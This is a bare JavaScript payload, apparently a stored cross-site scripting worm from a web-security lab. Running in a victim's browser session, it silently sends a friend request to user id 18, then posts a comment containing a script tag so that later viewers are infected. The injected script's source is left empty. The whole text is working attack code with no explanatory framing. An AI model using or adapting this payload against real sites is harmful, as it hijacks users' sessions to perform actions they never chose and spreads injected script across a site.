a=new XMLHttpRequest();
a.open('POST','/add_friend.php?id=18',true);
a.send();
b='hello, friend<script type="text/javascript" src=""></script>';
c=new XMLHttpRequest();
c.open('GET','/add_comment.php?comment='+b,true);
c.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
c.send();
console.log("success");
